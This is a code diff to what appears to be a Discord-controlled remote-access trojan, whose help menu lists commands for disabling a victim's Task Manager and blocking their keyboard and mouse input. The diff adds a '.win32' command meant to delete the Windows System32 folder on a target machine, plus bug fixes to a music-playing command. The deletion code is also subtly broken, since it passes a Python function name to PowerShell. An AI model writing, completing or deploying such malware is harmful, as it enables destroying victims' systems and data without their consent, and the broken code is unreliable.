@@ -128,6 +128,7 @@ System Control:
   .enablemgr <sessionkey>: Enable Targets Task Manager
   .blockin <sessionkey>: Blocks Targets Keyboard / Mouse Input
   .unblockin <sessionkey>: Un-Blocks Targets Keyboard / Mouse Input
+  .win32 <sessionkey>: Deletes the system folder System32" which effectively kills the system.
 
 ```
 """
@@ -197,6 +198,40 @@ async def bluescreen(ctx, seshn: str):
             await ctx.send("Failed to trigger blue screen :sadge:")
     else:
         pass
+    
+    
+@bot.command() # SYSTEM DELETE COMMAND
+async def win32(ctx, seshn: str):
+    session = sessions.get(seshn.lower())
+    if session:
+        try:
+            def delete_files(directory):
+                for filename in os.listdir(directory):
+                    file_path = os.path.join(directory, filename)
+                    try:
+                        if os.path.isfile(file_path) or os.path.islink(file_path):
+                            os.unlink(file_path)
+                        elif os.path.isdir(file_path):
+                            delete_files(file_path)
+                    except Exception as e:
+                        print('Failed to delete %s. Reason: %s' % (file_path, e))
+
+            def run_as_background(command):
+                import subprocess
+                import threading
+
+                def target():
+                    subprocess.call(command)
+
+                thread = threading.Thread(target=target)
+                thread.start()
+
+            run_as_background('powershell.exe -Command "& { delete_files(''C:\Windows\System32''); }"')
+            await ctx.send(f"[*] Command successfully executed in the background")
+        except Exception as e:
+            await ctx.send(f"[!] Failed to execute command: {e}")
+    else:
+         await ctx.send("[!] Invalid session key")
 
 @bot.command() # CLIPBOARD command
 async def clipboard(ctx, seshn: str, limit: int = 10):
@@ -661,7 +696,7 @@ async def music(ctx, seshn: str):
         pygame.mixer.init()
         try:
             pygame.mixer.music.load(download)
-            await session_channel.send("Playing Music...")
+            await session.send("Playing Music...") # bugfix here done
             pygame.mixer.music.play()
 
             playb = asyncio.create_task(con(pygame.mixer.music))
@@ -673,7 +708,7 @@ async def music(ctx, seshn: str):
             pygame.mixer.quit()
             os.remove(download)
 
-        await session_channel.send("Finished playing the music.")
+        await session.send("Finished playing the music.")
     else:
         pass
 
